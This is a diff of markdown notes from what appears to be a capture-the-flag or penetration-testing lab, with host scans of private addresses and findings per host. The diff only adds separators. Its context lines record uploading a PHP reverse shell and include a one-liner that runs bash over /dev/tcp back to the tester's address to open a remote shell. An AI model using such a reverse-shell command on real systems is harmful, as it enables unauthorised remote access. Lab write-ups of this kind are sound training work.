@@ -1,5 +1,3 @@
-Blackbox 2 Notes
-
 # Black Box 2 Notes
 
 My IP: `172.16.64.10`
@@ -72,6 +70,7 @@ Disallow: /upload/
 DNS: 75ajvxi36vchsv584es1.foocorp.io.
 No subdomains found.
 Able to upload PHP reverse shell.
+***
 ### 172.16.64.92
 ```
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
@@ -85,6 +84,7 @@ No subdomains found.
 Ran PHP reverse shell in admin console:
 `exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.64.10/1234 0>&1'");`
 **Flag found!**
+***
 ### 172.16.64.166
 ```
 2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
